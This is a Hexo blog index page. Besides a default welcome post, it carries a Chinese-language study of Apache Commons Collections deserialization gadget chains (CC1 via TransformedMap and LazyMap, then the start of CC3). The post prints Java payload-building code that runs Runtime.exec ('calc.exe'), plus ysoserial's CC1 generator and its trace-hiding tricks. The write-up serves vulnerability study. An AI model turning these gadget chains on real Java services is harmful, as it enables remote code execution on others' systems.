<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/07/hello-world/" class="article-date">
  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/07/hello-world/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\hello-world</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <hr>
<h2 id="title-Hello-World"><a href="#title-Hello-World" class="headerlink" title="title: Hello World"></a>title: Hello World</h2><p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/07/hello-world/" data-id="cm5kilbjd00004wcxce3oabvr" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\hello-world" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CC链反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/07/CC%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/07/CC%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\CC链反序列化</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CC1-TransformedMap"><a href="#CC1-TransformedMap" class="headerlink" title="CC1-TransformedMap"></a>CC1-TransformedMap</h1><p>AnnotationInvocationHandler+TransformedMap+ChainedTransformer+InvokeTransformer</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="（1）TransformedMap-类与Transformer"><a href="#（1）TransformedMap-类与Transformer" class="headerlink" title="（1）TransformedMap 类与Transformer"></a>（1）TransformedMap 类与Transformer</h3><p>作用</p>
<p>TransformedMap 是一个装饰器类，通过给定的转换逻辑（Transformer），对 Map 的键和值进行动态转换。主要特性包括：</p>
<ul>
<li>插入转换: 在 put 方法中，将输入的键和值通过指定的 Transformer 转换后再存储。</li>
<li>读取不变: 对 Map 的读取操作（如 get）返回的仍然是转换后的值。</li>
</ul>
<p>关键方法</p>
<ul>
<li>decorate静态方法，用于创建一个 TransformedMap 实例，指定键和值的 Transformer。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decorate(Map map, Transformer keyTransformer, Transformer valueTransformer)</span><br></pre></td></tr></table></figure>



<ul>
<li>put(Object key, Object value)	在插入键和值时分别应用 keyTransformer 和 valueTransformer 进行转换。</li>
<li>putAll(Map map)	对传入的 Map 中的每一对键和值进行批量转换并插入。</li>
</ul>
<h3 id="（2）AnnotationInvocationHandler的引入"><a href="#（2）AnnotationInvocationHandler的引入" class="headerlink" title="（2）AnnotationInvocationHandler的引入"></a>（2）AnnotationInvocationHandler的引入</h3><p>为了触发transformerChain#transform()，只需要向Map中加入一个新的元素。在demo中，可以手工执行outerMap.put(“test”, “xxxx”);来触发漏洞，但在实际反序列化时，需要找到一个类，它在反序列化的readObject逻辑里有类似的写入操作。</p>
<p>AnnotationInvocationHandler在readObject时会遍历它的memberValues的所有元素，并依次设置值。这里的memberValues设置为TransformedMap，在调用setValue设置值的时候就会触发TransformedMap里注册的Transformer。</p>
<p>AnnotationInvocationHandler类的构造函数有两个参数，第一个参数是一个Annotation类；第二个是</p>
<p>参数就是前面构造的Map。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732086825272-441a6ab8-bfb1-43ee-851c-655cbf1222c1.png"></p>
<h2 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h2><h3 id="（1）为什么map的key为value"><a href="#（1）为什么map的key为value" class="headerlink" title="（1）为什么map的key为value?"></a>（1）为什么map的key为value?</h3><p>在AnnotationInvocationHandler:readObject的逻辑中，有一个if判断，只有在其成立时候才会进入里面执行setValue，否则不会进入也就不会触发漏洞。为了使其成立，需要map的key中有type的方法名。</p>
<p>用到Retention.class，因为Retention有一个方法，名为value；所以给Map中放入一个Key是value的元素。</p>
<h3 id="（2）为什么8u71之后不能利用？"><a href="#（2）为什么8u71之后不能利用？" class="headerlink" title="（2）为什么8u71之后不能利用？"></a>（2）为什么8u71之后不能利用？</h3><p>8u71之后，对AnnotationInvocationHandler:readObject逻辑做了改动。</p>
<p>（<a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a>）</p>
<p>不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。也就是TransformedMap不再执行set或put操作了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,</span><br><span class="line">                      Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,</span><br><span class="line">                      Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">      <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">      innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">      <span class="comment">// TransformedMap父类AbstractInputCheckedMapDecorator$MapEntry#setValue(value) --&gt; transformerChain#transform() --&gt; transformerChain#transform()</span></span><br><span class="line">      <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">      <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">      <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">      construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      <span class="comment">// AnnotationInvocationHandler#readObject() --&gt; TransformedMap父类AbstractInputCheckedMapDecorator$MapEntry#setValue(value)</span></span><br><span class="line">      <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></table></figure>





<p>Gadget</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chain</span><br><span class="line"></span><br><span class="line">AnnotationInvocationHandler#readObject()  </span><br><span class="line"> TransformedMap父类AbstractInputCheckedMapDecorator$MapEntry#setValue(value)</span><br><span class="line"> TransformedMap#checkSetValue(value)</span><br><span class="line">  ChainedTransformer#transform()</span><br></pre></td></tr></table></figure>



<h1 id="CC1-LazyMap"><a href="#CC1-LazyMap" class="headerlink" title="CC1-LazyMap"></a>CC1-LazyMap</h1><p>AnnotationInvocationHandler+Proxy(Map)+AnnotationInvocationHandler+LazyMap+ChainedTransformer+InvokeTransformer</p>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><h3 id="（1）LazyMap与Transformer"><a href="#（1）LazyMap与Transformer" class="headerlink" title="（1）LazyMap与Transformer"></a>（1）LazyMap与Transformer</h3><p>LazyMap#decorate(Map, org.apache.commons.collections.Transformer) 是 Apache Commons Collections 库中的一个静态方法，用于创建一个延迟加载的 LazyMap 实例。</p>
<p>当调用 get(key) 方法访问一个不存在的键时，LazyMap 不会直接返回 null，而是调用 Transformer 的 transform(Object input) 方法生成一个新值。</p>
<p>LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的transform。其实这也好理解，LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用transform方法去获取一个值。</p>
<p>但是相比于TransformedMap的利用方法，LazyMap后续利用稍微复杂一些，原因是在</p>
<p>AnnotationInvocationHandler的readObject方法中并没有直接调用到Map的get方法。</p>
<h3 id="（2）代理的引入——一个AnnotationInvocationHandler②用来做代理"><a href="#（2）代理的引入——一个AnnotationInvocationHandler②用来做代理" class="headerlink" title="（2）代理的引入——一个AnnotationInvocationHandler②用来做代理"></a>（2）代理的引入——一个AnnotationInvocationHandler②用来做代理</h3><p>不过AnnotationInvocationHandler②类的invoke方法有调用到memberValues的get()。这里的memberValues就是上面的LazyMap。</p>
<p>而要触发AnnotationInvocationHandler②#invoke，使用AnnotationInvocationHandler②代理任意接口，在这个接口执行方法时都会调到get。</p>
<p>这里我们用AnnotationInvocationHandler②代理Map接口得到proxyMap实例。</p>
<h3 id="（3）一个AnnotationInvocationHandler①做入口"><a href="#（3）一个AnnotationInvocationHandler①做入口" class="headerlink" title="（3）一个AnnotationInvocationHandler①做入口"></a>（3）一个AnnotationInvocationHandler①做入口</h3><p>newInstance得到另一个AnnotationInvocationHandler①，它的memberValues是proxyMap。</p>
<p>在AnnotationInvocationHandler①执行readObject时，会执行proxyMap的entrySet方法，进而执行AnnotationInvocationHandler②的invoke,进而执行LazyMap的get方法。</p>
<p>p演示代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                 <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                 <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),&#125;;</span><br><span class="line"> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"> <span class="comment">// LazyMap#get(key) --&gt; ChainedTransformer#transform()</span></span><br><span class="line"> <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"> <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"> construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"> <span class="comment">// proxyMap#entrySet() --&gt; AnnotationInvocationHandler#invoke() --&gt; LazyMap#get(key)</span></span><br><span class="line"> <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"> <span class="comment">// AnnotationInvocationHandler#readObject() --&gt; proxyMap#entrySet</span></span><br><span class="line"> handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br></pre></td></tr></table></figure>

<p>ysoserial代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line">	<span class="comment">// inert chain for setup</span></span><br><span class="line">	<span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">		<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line">	<span class="comment">// real chain for after setup</span></span><br><span class="line">	<span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">				String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">				<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">				Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">				<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">				<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">	Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> handler;</span><br></pre></td></tr></table></figure>





<p>注意点（ysoserial）</p>
<p>（1）为什么最后才设置transformers的值</p>
<p>在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，所以，在本地调试代码的时候，因为调试器会在下面调用一些toString之类的方法，导致不经意间触发了命令。</p>
<p>ysoserial在POC的最后才将执行命令的Transformer数组设置到transformerChain中，原因是避免本地生成序列化流的程序执行到命令。</p>
<p>（2）ysoserial中的Transformer数组，为什么最后会增加一个ConstantTransformer(1)？</p>
<p>为了隐藏异常日志中的一些信息。如果这里没有ConstantTransformer，命令进程对象将会被LazyMap#get返回，导致我们在异常信息里能看到这个特征，java.lang.UNIXProcess：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732092273892-fd1bdd7a-95ce-4c86-9305-38e0d85cf9f0.png"></p>
<p>Gadget</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Chain</span><br><span class="line"></span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map(Proxy).entrySet()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Class.getMethod()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.getRuntime()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br></pre></td></tr></table></figure>



<h2 id="修复：8u71后不能使用的原因"><a href="#修复：8u71后不能使用的原因" class="headerlink" title="修复：8u71后不能使用的原因"></a>修复：8u71后不能使用的原因</h2><p>其实还是会通过entrySet()进入invoke的，但是这时候AnnotationInvocationHandler②中的memberValues值是AnnotationInvocationHandler②反序列化的新创建的LinkedHashMap,里面是空的。</p>
<p>进入AnnotationInvocationHandler的invoke后，触发map的get方法时，memberValues是空的LinkedHashMap，取不出entrySet,抛异常。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732179972754-80b337e9-2e69-4004-8b3e-e3d32a0f0c3c.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732180358523-9b6d75fd-75f4-4cbb-a20e-879759ca4095.png"></p>
<h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>CC1+InstantiateTransformer</p>
<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><h3 id="（1）与CC1-lazymap的关系"><a href="#（1）与CC1-lazymap的关系" class="headerlink" title="（1）与CC1-lazymap的关系"></a>（1）与CC1-lazymap的关系</h3><p>链的前面都是一样的，CC3只是换了ChainedTransformer中的类，不再使用InvokerTransformer，换成了</p>
<p>InstantiateTransformer+TrAXFilter+TemplatesImpl。</p>
<h3 id="（2）利用TemplatesImpl加载字节码"><a href="#（2）利用TemplatesImpl加载字节码" class="headerlink" title="（2）利用TemplatesImpl加载字节码"></a>（2）利用TemplatesImpl加载字节码</h3><p>包含TransletClassLoader子类，重写了defineClass方法。defineClass方法加载字节码。</p>
<p>_bytecodes是一个二维字节数组，是被加载的字节码。</p>
<p>通过newTransformer可以达到defineClass方法加载字节码。</p>
<h3 id="（3）绕过InvokerTransformer"><a href="#（3）绕过InvokerTransformer" class="headerlink" title="（3）绕过InvokerTransformer"></a>（3）绕过InvokerTransformer</h3><p>直接用InvokerTransformer反射调用TemplatesImpl的newTransformer也可以执行任意字节码。</p>
<p>但这里并不这样做，因为InvokerTransformer在很多地方被加入了黑名单。</p>
<p>CommonsCollections3并没有使用到InvokerTransformer来调用任意方法，而是用到了另一个</p>
<p>类，com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter。</p>
<p>TrAXFilter的构造方法中调用了(TransformerImpl) templates.newTransformer()。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732103512947-b0efdda6-8b93-4762-b021-eb1e88fb24f0.png"></p>
<h3 id="（4）调用构造方法的Transformer——InstantiateTransformer"><a href="#（4）调用构造方法的Transformer——InstantiateTransformer" class="headerlink" title="（4）调用构造方法的Transformer——InstantiateTransformer"></a>（4）调用构造方法的Transformer——InstantiateTransformer</h3><p>InstantiateTransformer会动态地根据给定的参数和类型调用特定的构造方法，实例化对象。</p>
